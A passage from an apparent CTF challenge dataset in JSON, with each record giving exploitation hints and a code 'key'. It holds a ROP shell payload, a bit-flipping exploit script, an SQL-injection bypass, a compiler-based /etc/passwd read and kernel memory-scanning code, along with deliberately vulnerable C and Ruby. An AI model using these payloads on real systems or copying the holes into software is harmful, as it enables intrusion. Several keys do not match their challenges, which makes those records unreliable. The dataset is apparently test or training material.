            "When attempting to exploit buffer overflow vulnerabilities to gain shell access, it's crucial to form a ROP (Return-Oriented Programming) chain that includes both a 'ret' gadget and the address of a function (e.g., `get_shell`) to successfully redirect execution flow. This technique can be particularly useful when direct jumps to desired functions are mitigated by security measures. Example payload construction includes padding (`\"A\"*152` in this case to overflow the buffer), followed by the address of `ret` to stabilize the stack, and then the address of the `get_shell` function or similar to gain control.  \nExample payload snippet: `payload = b\"A\"*152+p64(ret)+p64(get_shell)`",
            "Utilizing Python along with the `pwntools` library can significantly streamline the development of exploits for binary exploitation challenges. The `ELF` module from `pwntools` can be used to automate the extraction of function addresses (such as `get_shell` in the write-up) from binaries. This approach facilitates crafting precise payloads without manually digging through disassembled code. Additionally, `pwntools` supports both local and remote exploitation through its `process` and `remote` functions, enabling seamless transition from testing to actual exploitation against a challenge server.  \nNo example payload for this point as it is more about the approach and automation."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid get_shell() {\n    system(\"/bin/sh\");\n}\n\nvoid vulnerable_function() {\n    char buffer[128];\n    printf(\"Enter some data: \");\n    gets(buffer); // Vulnerable function\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "WelcomeCrypto",
        "write_up": "dataset/raw/WelcomeCrypto.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 50,
        "max_score": 350,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "For challenges presenting ciphertext with an unfamiliar pattern or appearance, consider trying well-known, simple cipher techniques if the ciphertext structure hints at their applicability. Specifically, when dealing with ROT-based ciphers, use online decoder tools to efficiently decipher hidden messages. If decryption results in a partially decoded message, applying another layer of simple cipher (like ROT13) might be necessary to reveal the full plaintext. Example payload for ROT47 followed by ROT13 if needed: Use an online ROT47 tool, then apply ROT13 decoder on any nonsensical output.",
            "In audio-based CTF challenges where a series of words are provided, particularly if they resemble elements of the NATO Phonetic Alphabet, convert the spoken words to their corresponding first letters to form a string. This resultant string may need further decryption, potentially through a simple cipher like Caesar Cipher indicated by a numeric clue within the challenge itself. Always remember to check the challenge description or any audio-transcribed content for numerical clues that suggest the type of cipher or the shift/key required for decryption. Example decoding process: Transcribe audio to letters using NATO Phonetic Alphabet \u2192 Decode using Caesar Cipher shift indicated by a clue (`6`)."
        ],
        "key": "```python\nfrom Crypto.Cipher import AES  \nimport itertools  \nimport string  \ngoal = 'f312cf9c53af89447e652e73b9754a0c'\n//asdfasdfasdfasdf encoded using their key  \nfor combo in itertools.product(string.letters, repeat = 2):     //bash all\ncombinations of two letters (16 bit)  \n\tkey = ''.join(combo) * 8                                //AES-128 requires a 16 byte key, so hopefully the key is just 8 of the 16 bit key.  \n\tcipher = AES.new(key, AES.MODE_ECB)  \n\tmsg = cipher.encrypt('asdfasdfasdfasdf')  \n\tif msg.encode('hex') == goal:  \n\t\tprint key  \n\t\tbreak  \n```"
    },
    {
        "name": "Well Known",
        "write_up": "dataset/raw/Well Known.md",
        "type": "web",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 100,
        "max_score": 998,
        "difficulty": 0.10020040080160321,
        "knowledge": [
            "When dealing with HTTP(S) URIs in CTF challenges where a 404 error is encountered, and the challenge implies or hints towards well-known locations, leverage RFC8615 which specifies a path prefix \"/.well-known/\" for well-known locations. Utilizing a list of known services from the \"/.well-known/\" directory can uncover hidden directories or files that are not directly linked from the website. This approach can be applied universally across any web challenges suggesting hidden paths. Example payload snippet: `/path/to/script.py` iterating over a list like `[\"security.txt\", \"acme-challenge\", ...]`.",
            "In challenges hinting at standards or protocols (like RFCs), researching the standard can provide direct clues or methodologies on how to approach the challenge. Specifically, for web-related challenges hinting at well-known paths or services, referring to resources like RFC8615 or curated lists (e.g., Wikipedia's list of well-known services) can guide the strategy for directory or file discovery to uncover hidden flags. This approach is universally applicable where the challenge provides oblique references to standards or protocols without explicit directions."
        ],
        "key": "```python\nfrom flask import Flask, send_from_directory, abort\n\napp = Flask(__name__)\n\n@app.route('/.well-known/<path:filename>')\ndef well_known(filename):\n    try:\n        return send_from_directory('.well-known', filename)\n    except FileNotFoundError:\n        abort(404)\n\nif __name__ == '__main__':\n    app.run()\n```"
    },
    {
        "name": "What the Flip_!",
        "write_up": "dataset/raw/What the Flip_!.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2021",
            "https://ctftime.org/event/1319/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving CBC mode encryption vulnerabilities, Bit (or Byte) Flipping attacks can be utilized to modify characters in the plaintext by altering the ciphertext in the relevant block. This is especially useful in scenarios where the goal is to change specific characters to meet certain conditions (like altering user permissions or bypassing authentication checks). To execute a successful attack, one must understand the position of the target character in the plaintext, the block size, and the XOR operation's properties. This knowledge allows for the calculation of the modified ciphertext byte that, when decrypted, will result in the desired plaintext alteration.\nExample payload modification step: calculate `dec = original_byte XOR original_char`, then `modified_byte = dec XOR desired_char`.",
            "To automate the exploitation of a Bit Flipping attack in a CTF challenge, Python scripts can be highly effective. Libraries like `pwn` can facilitate interaction with the challenge server, allowing for sending crafted inputs and receiving outputs. The key steps involve leaking the original ciphertext, calculating the modified byte to produce the desired plaintext change, and then constructing and sending the new ciphertext to achieve the objective (e.g., bypassing authentication). Understanding the hexadecimal representation of characters and the CBC decryption process is crucial for calculating the correct value to inject.\nExample Python script excerpt for automated exploitation: \n```python\nfrom pwn import *\n\np = remote(\"challenge.server.com\", 3000)\n# Interaction with the challenge to get the leaked ciphertext\nleaked_ciphertext = \"example_leaked_ciphertext\"\n# Calculation to modify a specific character in the plaintext\ndec = int(leaked_ciphertext[:2], 16) ^ ord('original_char')\nmodified_byte = hex(dec ^ ord('new_char'))\nnew_ciphertext = modified_byte[2:] + leaked_ciphertext[2:]\np.sendline(new_ciphertext)\n```"
        ],
        "key": "```python  \ndef decrypt_data(encryptedParams):  \n   cipher = AES.new(key, AES.MODE_CBC,iv)  \n   paddedParams = cipher.decrypt( unhexlify(encryptedParams))  \n   print(paddedParams)  \n   if b'admin&password=goBigDawgs123' in unpad(paddedParams,16,style='pkcs7'):  \n          return 1  \n   else:  \n          return 0  \n```"
    },
    {
        "name": "Whats_A_Syscall_",
        "write_up": "dataset/raw/Whats_A_Syscall_.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1.0,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When dealing with CTF challenges that require invoking a specific syscall to alter program behavior or escape a sandbox environment, the required syscall number can be directly modified in provided or example shellcode. This approach is applicable when the environment or challenge hints towards the usefulness of a particular syscall not originally present in the example code. To adapt shellcode for a different syscall, locate the portion of the hex-encoded shellcode corresponding to the syscall number and substitute it with the hexadecimal representation of the desired syscall number. For instance, to change an example shellcode invoking syscall 6 (SYS_ALERT) to invoke syscall 14 (SANDBOX_SPECIAL), replace the hex code '06' with '0e'. Example modified shellcode segment: `b8 a0 c0 04 08 8d 1d 15 00 00 00 01 c3 b8 0e 00 00 00 cd 80 c3`.",
            "In scenarios requiring the input of shellcode or other data into a virtual machine (VM) or restricted environment as part of a CTF challenge, AutoHotKey (AHK) scripts can be employed to automate the input process. This is particularly useful when manual entry is impractical due to the volume of data or when the input needs to be formatted in a specific way that is tedious to accomplish manually. Developing an AHK script enables participants to efficiently and accurately deliver payloads without direct interaction, streamlining the challenge-solving process."
        ],
        "key": "```assembly\nsection .text\n    global _start\n\n_start:\n    mov eax, 0x0804c0a0\n    lea ebx, [0x15]\n    add ebx, 1\n    ret\n    mov eax, 0x0e\n    int 0x80\n    ret\n    db 'Hello, binexec', 0\n```"
    },
    {
        "name": "what_r_the_noise",
        "write_up": "dataset/raw/what_r_the_noise.md",
        "type": "pwn",
        "competition": [
            "GACTF/2020",
            "https://ctftime.org/event/1115/tasks/"
        ],
        "score": 273,
        "max_score": 625,
        "difficulty": 0.4368,
        "knowledge": [
            "When working with challenges involving network connections (such as interacting with remote services using `nc`), and you encounter data that seems nonsensical or \"encrypted\", consider the possibility of encoded information. In this scenario, the encoded data may represent ASCII values of characters. Attempt to convert these values to their character equivalents using Python. An efficient way to do this is by rounding the values to the nearest whole number and converting them to characters using the `chr()` function within a list comprehension. \n   - Example processing in Python: \n     ```python\n     data = [101.675707, 108.104373, ...]  # Sample data received\n     decoded_message = [chr(int(round(i))) for i in data]\n     print(''.join(decoded_message))\n     ```",
            "In scenarios where the received data appears to involve noise or randomness that may affect the decoding accuracy, a method of data normalization can be used to filter out this noise. The provided approach involves collecting multiple datasets over the same connection (or similar conditions), summing corresponding values across these datasets, and then averaging them before applying the decoding process. This technique is useful for mitigating the effect of random noise on data, particularly in challenges where data transmission is intentionally obfuscated or subjected to interference.\n   - Example of noise reduction and data averaging in Python:\n     ```python\n     from pwn import *\n\n     def readData():\n         p.sendlineafter(\":\", \"2\", timeout=3)\n         ret = p.recvuntil(\"\\n\", timeout=1)\n         ret = ret.replace(\",\\n\", \"\")\n         return eval(\"[\" + ret + \"]\")\n\n     MAX_C = 1000\n     buf = readData()\n     L = len(buf)\n     C = 1\n     for k in range(MAX_C):\n         a = readData()\n         if len(a) != L:\n             continue\n         C += 1\n         for i in range(L):\n             buf[i] += a[i]\n     \n     for i in range(L):\n         buf[i] = int(round(buf[i] / C))\n\n     decoded_message = [chr(i) for i in buf]\n     print(\"\".join(decoded_message))\n     ```"
        ],
        "key": "```python\nfrom pwn import *\n\ndef readDat():  \n p.sendlineafter(\":\", \"2\", timeout=3)  \n ret = p.recvuntil(\"\\n\", timeout=1)  \n ret = ret.replace(\",\\n\",\"\")  \n return eval(\"[\"+ret+\"]\")\n\nMAX_C=1000  \nbuf=readDat()  \nL=len(buf)  \nC=1  \nfor k in range(0,MAX_C):  \n a=readDat()  \n #print(a)  \n if len(a)!=L:  \n   continue  \n C = C+1  \n for i in range(0,L):  \n   buf[i] += a[i]\n\nfor i in range(0,L):  \n buf[i] = int(round(buf[i] / C))\n\nbuf_arr = [chr(i) for i in buf]  \n#print(\"COUNT=\"+str(C))  \nprint(\"\".join(buf_arr))\n```"
    },
    {
        "name": "Who Can Haz Flag",
        "write_up": "dataset/raw/Who Can Haz Flag.md",
        "type": "The type of this challenge is **forensics**.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When analyzing network traffic in Wireshark for CTF challenges, particularly when the challenge hints suggest protocols like ARP or DNS, it is beneficial to sort the packets by protocol. This approach aids in focusing on relevant packets that may contain hidden or obfuscated data related to the flag. By concentrating on these protocols, one can unveil patterns or anomalies that are instrumental in puzzle resolution.",
            "In challenges involving packet captures (PCAPs) where data might be hidden or encoded within packet fields, a methodical examination of specific parts of the packets, such as the last character in the hexdump of ARP requests, can reveal hidden messages or flags. This tactic of extracting data from non-standard fields or components of packets underscores the importance of a detailed and creative analysis of packet captures, beyond the conventional examination of packet payloads or headers. \n\nExample extraction strategy from an ARP request hexdump: Collect the last character of each relevant packet's hexdump, in sequence, to form a string that may represent the flag or a part of it."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid process_arp_request(char *packet) {\n    char buffer[64];\n    strcpy(buffer, packet); // Vulnerable to buffer overflow\n    printf(\"Processing ARP request: %s\\n\", buffer);\n}\n\nint main() {\n    char arp_packet[128] = \"Who has 192.168.1.1? Tell 192.168.1.2\";\n    process_arp_request(arp_packet);\n    return 0;\n}\n```"
    },
    {
        "name": "Who drew on my program_",
        "write_up": "dataset/raw/Who drew on my program_.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing an AES encryption challenge without the initialization vector (IV) and partial ciphertext, one can recover the unknown parts of the ciphertext and consequently the IV by utilizing known plaintext-ciphertext pairs. This method hinges on the property that the decryption of a ciphertext block in AES CBC mode is independent of the IV for blocks after the first one. Therefore, by knowing parts of the ciphertext and the corresponding plaintext, and through a brute-force search for the missing portions of the key, one can decrypt the ciphertext to recover the originally encrypted message.   \nExample payload:\n   - Given partial KEY: `9aF738g9AkI112`\n   - Partial Known Plaintext: `\"The message is protected by AES!\"`\n   - Partial Ciphertext: `9e000000...db9d67f0`\n   - Brute-force the missing key parts and use the known plaintext to validate the key.",
            "After recovering the full ciphertext and key, the initial vector (IV) used for AES encryption can be obtained by XORing the first block of plaintext with the first block of decrypted ciphertext. This approach is specifically applicable in scenarios where the encryption mode is CBC, as the IV is effectively combined with the plaintext of the first block before encryption. This characteristic allows for the retrieval of the IV post decryption if the plaintext and ciphertext are known.\n   - Procedure to recover IV:\n     - Decrypt recovered ciphertext using the found key.\n     - XOR the first block of decrypted ciphertext with the first block of known plaintext.\n     - Convert the result to hexadecimal to obtain the IV.  \nExample payload:\n   - Known PlatinText: `\"The message is protected by AES!\"`\n   - Decrypted Ciphertext (first block): Derived from decryption process.\n   - `IV = Hex(XOR(PlainTextBlock, DecryptedCiphertextBlock))`"
        ],
        "key": "```python  \n#!/usr/bin/python\n\nfrom Crypto.Cipher import AES  \nimport binascii  \nimport string  \nimport itertools\n\n# given  \nbKEY = \"9aF738g9AkI112\"\n\n# use null bytes to minimize effect on output  \nIV = \"\\x00\"*16\n\ndef encrypt(message, passphrase):  \n  aes = AES.new(passphrase, AES.MODE_CBC, IV)  \n  return aes.encrypt(message)\n\ndef decrypt(cipher, passphrase):  \n  aes = AES.new(passphrase, AES.MODE_CBC, IV)  \n  return aes.decrypt(cipher)\n\npt = \"The message is protected by AES!\"  \nct = \"9e00000000000000000000000000436a808e200a54806b0e94fb9633db9d67f0\"\n\n# find the key using the plaintext and ciphertext we know, since the IV has no\neffect on the decryption of the second block  \nfor i in itertools.product(string.printable, repeat=2):  \n  eKEY = ''.join(i)  \n  KEY = bKEY + eKEY  \n  ptc = decrypt(binascii.unhexlify(ct), KEY)  \n  if ptc[16] == pt[16] and ptc[30] == pt[30] and ptc[31] == pt[31]:  \n      print \"Got KEY: \" + str(KEY)  \n      fKEY = KEY  \n      pt2 = binascii.hexlify(decrypt(binascii.unhexlify(ct), fKEY))[32:]  \n      print \"Decrypting with CT mostly zeroes gives: \" + pt2  \n      print \"Should be: \" + binascii.hexlify(pt[16:])  \n# we can now recover the rest of the ciphertext ct by XOR(pt[i], decrypted[i],\nsince we chose ct 00 in all the positions we are going to recover  \n      answer = \"\"  \n      for i in range(13):  \n          pi = pt[17+i]  # letters from the plaintext  \n          pti = pt2[2*i+2:2*i+4]  # 2 hex letters from decryption of second block  \n          answer += \"%02X\" % (ord(pi) ^ int(pti, 16))  \n      rct = ct[0:2] + answer.lower() + ct[28:]  \n      print \"Which means CT was: \" + rct\n\n# now we can decrypt the recovered ct and xor against the pt to recover the IV  \nwpt = decrypt(binascii.unhexlify(rct), fKEY)  \nIV = \"\"  \nfor i in range(16):  \n  p = ord(pt[i]) ^ ord(wpt[i])  \n  IV += \"%02X\" % p  \nIV = binascii.unhexlify(IV)\n\n# sanity check:  \naes = AES.new(fKEY, AES.MODE_CBC, IV)  \nprint \"Sanity check: \" + aes.decrypt(binascii.unhexlify(rct))\n\n# We won!  \nprint \"The IV is: \" + IV  \n```"
    },
    {
        "name": "who knows john dows_",
        "write_up": "dataset/raw/who knows john dows_.md",
        "type": "reverse",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "SQL Injection vulnerabilities occur when inputs are not validated, sanitized, or parameterized, allowing attackers to inject malicious SQL queries into an application. If the application uses string interpolation for constructing SQL queries, it becomes susceptible to these types of attacks. The example payload demonstrates how attackers can bypass authentication mechanisms by manipulating the query to return true, irrespective of the provided user credentials.\n   - Example payload for bypassing login authentication: `';--`",
            "A simple reversing of inputs as a form of obfuscation or hashing is not secure. In this scenario, knowing that the password hashing function merely reverses the input password, an attacker can reverse-engineer the mechanism to bypass security measures. This highlights the need for implementing robust cryptographic hashing functions that cannot be easily inverted or guessed.\n   - In practice, always use proper cryptographic functions for hashing passwords (e.g., bcrypt, SHA-256) and implement additional security measures such as salting to prevent common attacks like brute force or reverse engineering of hash functions."
        ],
        "key": "```ruby\ndef login(identification, password)  \n  hashed_input_password = hash(password)  \n  query = \"select id, phone, email from users where email = '#{identification}' and password_digest = '#{hashed_input_password}' limit 1\"  \n  puts \"SQL executing: '#{query}'\"  \n  @database[query].first if user_exists?(identification)  \nend\n\ndef hash(password)  \n  password.reverse  \nend\n```"
    },
    {
        "name": "whyOS",
        "write_up": "dataset/raw/whyOS.md",
        "type": "forensics",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 300,
        "max_score": 1285,
        "difficulty": 0.23346303501945526,
        "knowledge": [
            "When encountering log files in forensics CTF challenges, if initial searches for obvious keywords like \"flag\" are fruitless, one should consider analyzing associated binaries or application packages for hidden functionalities or processes that might reveal how the flag is handled or where it might be located. This includes disassembling binaries to look for specific methods that manipulate or display the flag, as seen with the `setFlag` method in the provided challenge. This approach is particularly useful in challenges involving applications or operating systems, where the flag may be processed or logged by the application.",
            "For extracting flags from large log files where the flag format is unknown and not easily searchable, using regular expressions to match potential flag patterns based on the context provided by the challenge can be highly effective. In scenarios where it's known that the flag is logged by a specific application or under specific conditions, a tailored regex search, such as looking for unique hex strings that don't contain spaces and are within a specific length range (`+Preferences +[^ ]{5,50}$`), can greatly narrow down the search results, making it possible to identify the flag amid extensive logs. This technique is applicable in situations where direct keyword searches are impractical due to the flag being stored or logged in an unconventional format."
        ],
        "key": "```objc\nvoid -[CSAWRootListController setflag](void * self, void * _cmd) {  \n   sp = sp - 0x30;  \n   r0 = *self;  \n   r0 = [r0 alloc];  \n   r0 = [r0 initWithContentsOfFile:@\"/var/mobile/Library/Preferences/com.yourcompany.whyos.plist\"];  \n   var_10 = r0;  \n   if ([var_10 objectForKey:@\"flag\", @\"flag\"] != 0x0) {  \n           var_2C = [var_10 objectForKey:@\"flag\", r1];  \n   }  \n   else {  \n           var_2C = @\"\";  \n   }  \n   NSLog(@\"%@\", var_2C);  \n   return;  \n}  \n```"
    },
    {
        "name": "Wifi Password of The Day",
        "write_up": "dataset/raw/Wifi Password of The Day.md",
        "type": "crypto",
        "competition": [
            "Tenable/2022",
            "https://ctftime.org/event/1668/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "In scenarios where data is compressed before encryption, the CRIME attack can be utilized to deduce unknown parts of the compressed data by exploiting the compression algorithm's efficiency with repeating sequences. Specifically, when part of the compressed data is known (e.g., a flag format), attackers can submit variations of the data to observe changes in the compressed output's length. The length variation indicates a match or mismatch with the unknown part, allowing for character-by-character brute-forcing of the hidden data. This technique requires the ability to insert controlled data into the compression algorithm alongside the target data.",
            "When dealing with block ciphers like AES in CBC mode, where the plaintext is padded before encryption, adding arbitrary padding to the attacker-controlled data can help align the data to block boundaries. This adjustment facilitates the CRIME attack by ensuring that a single byte of additional compressed data can alter the overall length of the resulting ciphertext. This method is crucial in situations where the encryption mode does not inherently leak compression length through ciphertext length. The 'Two Tries' method further refines this approach by making two attempts with differently ordered data, improving accuracy in identifying correct characters by comparing the lengths of the resulting ciphertexts to distinguish between actual matches and compression-based false positives.\n\nSample of payload for character guess and padding adjustment (conceptual rather than specific code):\n```python\nknown_part = \"flag{\"\nguess_character = \"a\"\npadding = generate_padding_until_block_boundary_is_crossed()  # Conceptual function\nattempt = known_part + guess_character + padding\n```\n\nAnd for the 'Two Tries' method:\n```python\n# Assume \"flag{a\" is the part being tested, and \"~#:/[|/\" is the non-compressible string\nfirst_try = known_part + guess_character + \"~#:/[|/\"\nsecond_try = known_part + \"~#:/[|/\" + guess_character\n```"
        ],
        "key": "```python\nwifi_data = {\"user:\": user,  \n            \"pass:\": current_wifi_password}\n\nto_send = json.dumps(wifi_data)  \n\nmsg = zlib.compress(to_send.encode('utf-8'))\n\ntext_padded = msg + (AES.block_size - (len(msg) % AES.block_size)) * b'\\x00'\n\nlogging.info(\"sending wifi password to user %s\" + user)\n\niv = 16 * b'\\x00'  \ncipher = AES.new(encryption_key, AES.MODE_CBC, iv)\n\ncipher_enc = cipher.encrypt(text_padded)  \nreturn cipher_enc  \n```"
    },
    {
        "name": "Will it stop_",
        "write_up": "dataset/raw/Will it stop_.md",
        "type": "pwn",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "If a CTF challenge involves accessing or manipulating files on a server where direct execution or reading is restricted, one can misuse the C preprocessor (`cpp`) `#include` directive to leak file contents indirectly through compiler error messages. This technique can be especially effective in challenges where the environment compiles code supplied by the user and returns compiler errors. It works under the condition that the filepath is known or can be guessed and that the compilation process is visible to the user.  \nExample payload: `#include \"/path/to/target/file\"`",
            "To circumvent parsing errors brought about by the contents of an included file during compilation, one can use C preprocessor directives and constructs (`#define`, ternary operators, etc.) to manipulate or bypass the problematic syntax causing the compilation to fail. This is applicable in scenarios where an initial attempt to read a file's contents using the `#include` directive is thwarted by syntax errors reflected in compiler messages. By creatively adjusting or adding to the code, one may force the compiler to reveal more information or even the entire contents of the file.  \n   Example adjustments to bypass parsing errors:  \n   ```\n   #define justCTF 1  \n   int valid_variable = 1;  \n   int another_variable = 1 ? #include </path/to/target/file>  \n   ```"
        ],
        "key": "```c\n#include \"/etc/passwd\"\n```"
    },
    {
        "name": "window",
        "write_up": "dataset/raw/window.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1.0,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When dealing with kernel exploitation challenges that involve bypassing KASLR (Kernel Address Space Layout Randomization), a reliable approach is leveraging fixed addresses in the kernel that are not affected by KASLR. For instance, using the `cpu_entry_area` to leak kernel addresses can help defeat KASLR by reading a pointer that leads to the .text section of the kernel. This technique exploits the fact that certain memory areas remain at constant addresses regardless of ASLR, thereby allowing an attacker to determine the real, randomized addresses of other kernel components or data.",
            "In scenarios where the filesystem, such as `initramfs`, is directly mapped into the physical memory and accessible through the kernel's `physmap`, an arbitrary read primitive can be used to search this memory area for specific patterns or data. This can be particularly useful in CTF challenges or real-world scenarios for extracting sensitive information directly from the memory. By calculating the `physmap` address from a known kernel address (e.g., kernel .text base address) and reading through it, attackers can find and exfiltrate data like flags or credentials embedded within the `initramfs` or other memory-mapped files.\n\nSample exploitation technique for searching a pattern in `physmap`:\n```c\nuint64_t kernel_text_base = ...; // Assume this is already leaked\nuint64_t physmap_base = kernel_text_base + OFFSET_TO_PHYSMAP; // OFFSET_TO_PHYSMAP needs to be determined per kernel version/setup\nuint64_t offset = 0;\nrequest_t req;\nwhile (true) {\n    req.kptr = physmap_base + offset;\n    // Assuming ioctl(fd, 0x1337, &req) is the way to issue the read request, and the data gets populated in req.buf\n    for (size_t i = 0; i < 256; i++) {\n        if (memcmp(req.buf + i, \"FLAG_PATTERN\", FLAG_PATTERN_LENGTH) == 0) {\n            // FLAG_PATTERN and FLAG_PATTERN_LENGTH need to match what you're looking for\n            printf(\"Flag found at offset %lx: %s\\n\", offset + i, req.buf + i);\n            break;\n        }\n    }\n    offset += 256; // Adjust based on the read size\n}\n```\nNote: Replace `FLAG_PATTERN`, `FLAG_PATTERN_LENGTH`, and `OFFSET_TO_PHYSMAP` with values specific to the challenge or target environment."
        ],
        "key": "```c\n__int64 __fastcall device_ioctl(file *filp, __int64 cmd, unsigned __int64 arg)  \n{  \n __int64 v3; // rbp  \n __int64 v4; // rdx  \n __int64 v5; // rbx  \n __int64 result; // rax  \n request req; // [rsp+0h] [rbp-120h] BYREF  \n unsigned __int64 v8; // [rsp+108h] [rbp-18h]  \n __int64 v9; // [rsp+118h] [rbp-8h]\n\n _fentry__(filp, cmd, arg);  \n v9 = v3;  \n v8 = __readgsqword(0x28u);  \n if ( (_DWORD)cmd == 0x1337 )  \n {  \n   copy_from_user(&req, arg, 0x108LL);  \n   result = (int)copy_to_user(arg.buf, req.ptr, 0x100LL);  \n }  \n else  \n {  \n   result = -1LL;  \n }  \n if ( v8 != __readgsqword(0x28u) )  \n   JUMPOUT(0xC3LL);  \n return result;  \n}  \n```"
    },
    {
        "name": "Winter",
        "write_up": "dataset/raw/Winter.md",
        "type": "crypto",
        "competition": [
            "InCTF/2018",
            "https://ctftime.org/event/662/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When attacking an implementation of the Winternitz One-Time Signature scheme, a vulnerability may exist if the scheme allows an attacker to learn information about intermediate hash chain nodes from an original signature. This exposure can lead to signature forgery if for two messages \\(m_1\\) and \\(m_2\\), the condition \\(256 - n_1 < 256 - n_2\\) holds for every byte in their respective SHA-256 hashes. In such cases, an adversary can hash parts of the given signature from \\(m_1\\) the necessary number of times to forge a signature for \\(m_2\\), assuming they can control or know \\(m_2\\) to ensure the condition is met.",
            "To exploit the vulnerability in a practical scenario involving the Winternitz One-Time Signature scheme, one can use a brute force approach to find pairs of messages where the SHA-256 hash of the first message \\(m_1\\) has each byte greater than the corresponding byte in the SHA-256 hash of the second message \\(m_2\\). This allows the forging of a signature for \\(m_2\\) using the signature for \\(m_1\\). The approach involves iterating through possible messages, calculating their hashes, and checking if the condition \\(m_{1_{hash}[i]} > m_{2_{hash}[i]}\\) for all i in the hash bytes is satisfied. Once a valid pair is found, intermediate hashing steps from the original signature can be used to generate a new signature for \\(m_2\\).\n   \n   Example brute force algorithm snippet (Python):\n   ```py\n   from hashlib import sha256\n\n   # Initialize min and max values to track the extremes\n   largest_min_value_of_maxlist = 0\n   smallest_max_value_of_minlist = 256\n\n   # Placeholder for minimum and maximum messages and their hash lists\n   minlist, maxlist = [], []\n   min_msg, max_msg = '', ''\n\n   # Brute force through potential messages\n   for i in range(10000000):\n       h = sha256(str(i).encode()).digest()\n       mx, mn = max(h), min(h)\n       # Update smallest and largest tracking variables\n       smallest_max_value_of_minlist = min(smallest_max_value_of_minlist, mx)\n       largest_min_value_of_maxlist = max(largest_min_value_of_maxlist, mn)\n\n       # Logic to check and break if condition is met\n       # Detailed logic based on comparison of min and max lists as per challenge requirements\n   ```\n   \n   Using this information and methodology can lead to successfully exploiting vulnerabilities in certain cryptographic implementations, specifically those involving the reuse or exposure of intermediate hash states in schemes like the Winternitz One-Time Signature."
        ],
        "key": "```python\nclass Wots:  \n    def __init__(self, sk, vk):  \n        self.sk = sk  \n        self.vk = vk\n\n    @classmethod  \n    def keygen(cls):  \n        sk = [os.urandom(32) for _ in range(32)]  \n        vk = [cls.hash(x, 256) for x in sk]  \n        return cls(sk, vk)\n\n    @classmethod  \n    def hash(cls, x, n):  \n        for _ in range(n):  \n            x = sha256(x).digest()  \n        return x\n\n    def sign(self, msg):  \n        m = self.hash(msg, 1)  \n        sig = b''.join([self.hash(x, 256 - n) for x, n in zip(self.sk, m)])  \n        return sig\n\n    def verify(self, msg, sig):  \n        chunks = [sig[i:i+32] for i in range(0, len(sig), 32)]  \n        m = self.hash(msg, 1)  \n        vk = [self.hash(x, n) for x, n in zip(chunks, m)]  \n        return self.vk == vk\n```"
    },
    {
        "name": "wisdom2",
        "write_up": "dataset/raw/wisdom2.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting operating systems or software, inspecting the implementation of system calls like ptrace can reveal vulnerabilities where registers or flags are not properly validated. In this case, the vulnerability lay in setting the eflags to arbitrary values, allowing an attacker to modify the IOPL bits, thus gaining access to I/O ports and the interrupt flag in userspace. Whenever dealing with system-level programming or security evaluations, pay attention to how input is validated, especially when it involves register states or system flags that control hardware access levels.",
            "To exploit vulnerabilities that allow for arbitrary register manipulation, one approach is to enable specific capabilities (like setting IOPL to 3 for accessing I/O ports in userspace) and then execute or inject code that performs operations not usually permitted in Ring 3 (userspace). This could include writing a simple driver to read from or write to a device directly, leveraging existing drivers or code snippets. For this specific vulnerability, using an ATA driver allowed reading the flag directly from an IDE drive. This exploitation technique is especially powerful in kernels or operating systems challenges and should be considered when direct memory, device access, or privilege escalation is needed.\n\n    Example snippet for setting IOPL and leveraging an ATA driver to read from /dev/hdb:\n    ```C\n    // This is a conceptual snippet and may not work as-is\n    ptrace_regs.eflags |= 3 << 12; // Set IOPL to 3\n    execute_ata_pio_read(\"/dev/hdb\"); // Function to utilize an ATA PIO driver to read the disk\n    ```"
        ],
        "key": "```C++\nvoid copy_ptrace_registers_into_kernel_registers(RegisterState& kernel_regs,\nconst PtraceRegisters& ptrace_regs)  \n{  \n   kernel_regs.eax = ptrace_regs.eax;  \n   kernel_regs.ecx = ptrace_regs.ecx;  \n   kernel_regs.edx = ptrace_regs.edx;  \n   kernel_regs.ebx = ptrace_regs.ebx;  \n   kernel_regs.esp = ptrace_regs.esp;  \n   kernel_regs.ebp = ptrace_regs.ebp;  \n   kernel_regs.esi = ptrace_regs.esi;  \n   kernel_regs.edi = ptrace_regs.edi;  \n   kernel_regs.eip = ptrace_regs.eip;  \n   kernel_regs.eflags = ptrace_regs.eflags;  \n}  \n```"
    },
    {
        "name": "Wolfie's Password",
        "write_up": "dataset/raw/Wolfie's Password.md",
        "type": "forensics",
        "competition": [
            "DarkCTF/2020",
